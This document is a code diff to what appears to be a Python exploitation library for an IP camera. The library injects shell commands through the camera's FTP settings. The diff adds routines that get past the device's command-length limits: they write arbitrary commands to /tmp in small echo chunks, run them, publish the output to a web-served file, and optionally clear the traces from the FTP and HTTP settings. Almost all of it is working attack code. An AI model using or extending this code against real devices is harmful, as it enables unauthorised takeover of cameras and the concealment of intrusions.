@@ -1,6 +1,7 @@
 from ..interfaces.http import methods as http_methods
 from ..interfaces.http import parameters as http_params
 from .. import decorators
+from .. import utils
 import logging
 
 """
@@ -8,6 +9,7 @@ Imports:
     ..interfaces.http.methods as http_methods
     ..interfaces.http.parameters as http_params
     ..decorators
+    ..utils
     logging
 
 Contains:
@@ -18,6 +20,8 @@ Contains:
     _command_inject_ret_clear_ftp
     _command_inject_ret_clear_http
     _command_inject_retrieve
+    _command_inject_blind_huge
+    _command_inject_ret_huge
 
 Constants defined here:
     MAX_LEN_BLIND
@@ -47,12 +51,15 @@ def command_inject(http, command, blind=True, clear=True):
         ...         (if applicable)
         ...     Deleting the command from the ftp username
 
-    Note: It's avoidable to stay away from commands such as top and ps
+    Note: It's advisable to stay away from commands such as top and ps
     Note: If commands that are blocking are executed, they will
         ... freeze the camera
     Note: This will delete any pre-configured ftp settings
-    Note: For blind injection, len(command) <= MAX_LEN_BLIND (29)
-        ... For non-blind injection, len(command) <= MAX_LEN_RET_LONG (22)
+    Note:
+        For blind injection, len(command) <= MAX_LEN_BLIND (29)
+        For non-blind injection, len(command) <= MAX_LEN_RET_LONG (22)
+        Newly implemented, (extremely) long commands can be executed
+        ... just slowly
     Note: The command will be stripped
     """
 
@@ -64,11 +71,13 @@ def command_inject(http, command, blind=True, clear=True):
         else:
             logger.warning \
             (
-                'Command too long for blind command injection, '
+                'Command too long for (fast) blind command injection, '
                 f'len(command) <= {MAX_LEN_BLIND}'
             )
 
-            return False # Command too long for blind injection
+            #return False # Command too long for blind injection
+
+            return _command_inject_blind_huge(http, command, clear=clear)
     else:
         if len(command) <= MAX_LEN_RET_MIN:
             return _command_inject_ret_min(http, command, clear=clear)
@@ -77,11 +86,13 @@ def command_inject(http, command, blind=True, clear=True):
         else:
             logger.warning \
             (
-                'Command too long for non-blind command injection, '
+                'Command too long for (fast) non-blind command injection, '
                 f'len(command) <= {MAX_LEN_RET_LONG}'
             )
 
-            return False # Command too long for non-blind injection
+            #return False # Command too long for non-blind injection
+
+            return _command_inject_ret_huge(http, command, clear=clear)
 
 @decorators.debug()
 def _command_inject_blind(http, command, true_val=False, clear=True):
@@ -130,7 +141,13 @@ def _command_inject_blind(http, command, true_val=False, clear=True):
             'injection failed'
         )
 
-        return False
+        logger.info \
+        (
+            'http.set_ftp sometimes fails, this does '
+            'not neccessarily mean that injection failed'
+        )
+
+        #return False # It has been shown, it may still set successfully
 
     resp_apply = http_methods.ftptest(http=http)
 
@@ -175,7 +192,7 @@ def _command_inject_ret_min(http, command, clear=True):
 
     assert len(command) <= MAX_LEN_RET_MIN
 
-    payload = f'$({command}>/system/www/_)'
+    payload = f'{command}>/system/www/_'
 
     ret_inject = _command_inject_blind(http, payload, clear=False)
 
@@ -217,21 +234,21 @@ def _command_inject_ret_long(http, command, clear=True):
 
     assert len(command) <= MAX_LEN_RET_LONG
 
-    payload_write = f'$({command}>/tmp/_)'
+    payload_write = f'{command}>/tmp/_'
 
     ret_write = _command_inject_blind(http, payload_write, clear=False)
 
     if not ret_write:
-        logger.debug('Bling injection failed to capture stdout')
+        logger.debug('Non-blind injection failed to capture stdout')
 
         return False
 
-    command_move = '$(mv -f /tmp/_ /system/www/_)'
+    command_move = 'mv -f /tmp/_ /system/www/_'
 
     ret_move = _command_inject_blind(http, command_move, clear=False)
 
     if not ret_move:
-        logger.debug('Blind injection failed to move stdout')
+        logger.debug('Non-blind injection failed to move stdout')
 
         return False
 
@@ -249,7 +266,7 @@ def _command_inject_ret_long(http, command, clear=True):
 
         if not ret_clear_http:
             logger.debug('Clearing http failed')
-            
+
             return False
 
     return resp_retrieve
@@ -284,6 +301,8 @@ def _command_inject_retrieve(http):
     Returns the contents of the command output file
 
     :param http - The <Http> instance
+
+    Note: strips a single '\n' from the right
     """
 
     resp = http.get('_')
@@ -299,4 +318,97 @@ def _command_inject_retrieve(http):
 
         return None
 
+    if resp_raw.endswith('\n'): # Strip a single '\n' from the right
+        resp_raw = resp_raw[:-1]
+
     return resp_raw
+
+@decorators.debug()
+def _command_inject_blind_huge(http, command, clear=True):
+    """
+    Performs blind command injection on a huge command
+
+    :param http - The <Http> instance
+    :param command - The command to inject
+    :param clear - Boolean, whether to clear traces of the command
+
+    Note: For when the length of command is > MAX_LEN_BLIND
+    Note: This is very slow!
+
+    Writes the command to a file in chunks, then executes
+    ... the contents of the file
+    """
+
+    payload_write_overwrite = 'echo -n "{payload}">/tmp/_'
+    payload_write_append = 'echo -n "{payload}">>/tmp/_'
+    payload_apply = '$(cat /tmp/_)>/tmp/_' # Over-writes itself, so it can be used to retrieve stdout
+
+    chunk_size = MAX_LEN_BLIND - len(payload_write_append.format(payload='')) # 11
+
+    failed = False
+
+    for index, sub_payload in enumerate(utils.chunk(command, 11)): # len(sub_payload) <= 11
+        if index == 0: # If first write, over-write pre-existing contents
+            payload = payload_write_overwrite.format(payload=sub_payload)
+        else: # Else append to file
+            payload = payload_write_append.format(payload=sub_payload)
+
+        ret_write = _command_inject_blind(http, payload, clear=False)
+
+        if not ret_write:
+            failed = True # If that failed, likely everything following will
+
+    ret_apply = _command_inject_blind(http, payload_apply, clear=clear)
+
+    if not ret_apply:
+        failed = True
+
+    return failed
+
+@decorators.debug()
+def _command_inject_ret_huge(http, command, clear=True):
+    """
+    Performs non-blind command injection on a huge command
+
+    :param http - The <Http> instance
+    :param command - The command to inject
+    :param clear - Boolean, whether to clear traces of the command
+
+    Note: For when the length of command is > MAX_LEN_RET_LONG
+    Note: This is very slow!
+
+    Writes the command to a file in chunks, then executes
+    ... the contents of the file (storing the stdout), then
+    ... it moves the stdout to a web page, then returns the
+    ... contents of that webpage
+    """
+
+    ret_apply = _command_inject_blind_huge(http, command, clear=False)
+
+    command_move = 'mv -f /tmp/_ /system/www/_'
+
+    ret_move = _command_inject_blind(http, command_move, clear=False)
+
+    if not ret_move:
+        logger.debug('Non-blind injection failed to move stdout')
+
+        return False
+
+    resp_retrieve = _command_inject_retrieve(http)
+
+    if clear:
+        ret_clear_ftp = _command_inject_ret_clear_ftp(http)
+
+        if not ret_clear_ftp:
+            logger.debug('Clearing ftp failed')
+
+            return False
+
+        ret_clear_http = _command_inject_ret_clear_http(http)
+
+        if not ret_clear_http:
+            logger.debug('Clearing http failed')
+
+            return False
+
+    return resp_retrieve
